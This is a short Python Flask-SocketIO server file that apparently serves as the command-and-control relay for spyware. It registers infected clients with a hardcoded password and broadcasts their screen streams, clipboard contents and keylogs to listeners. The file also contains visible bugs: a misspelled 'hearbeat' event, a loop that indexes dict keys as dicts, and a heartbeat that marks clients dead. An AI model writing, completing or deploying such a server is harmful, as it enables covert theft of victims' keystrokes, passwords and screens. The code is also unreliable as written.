from flask import request
from flask_socketio import emit
from server import socketio
import json

clients = {}

@socketio.on('register')
def handle_register(data):
    data = json.loads(data)
    
    password = data.get('password')

    if password == "4@Gd9#kLp1!xQ8nZ$":
        client = get_client(data.get('guid'))
        if client:
            client['alive'] = True
        else:
            clients[request.sid] = data_to_client(data)

        emit('response', {'message': 'Registered successfully'}, room=request.sid)
    else:
        emit('response', {'message': 'Invalid password'}, room=request.sid)

@socketio.on('update_stream')
def update_stream(data):
    emit('update_stream', data, broadcast=True)

@socketio.on('update_clipboard')
def update_clipboard(data):
    emit('update_clipboard', data, broadcast=True)

@socketio.on('update_keylogs')
def update_keylogs(data):
    emit('update_keylogs', data, broadcast=True)

@socketio.on("hearbeat")
def heartbeat(data):
    data = json.loads(data)

    for client in clients:
        if data.get('guid') == client['guid']:
            client['alive'] = False

def data_to_client(data):
    return {
        'client_id': data.get('client_id'),
        'ip': data.get('ip'),
        'guid': data.get('guid'),
        'alive': True
    }

def get_client(guid):
    for client in clients.values():
        if guid == client['guid']:
            return client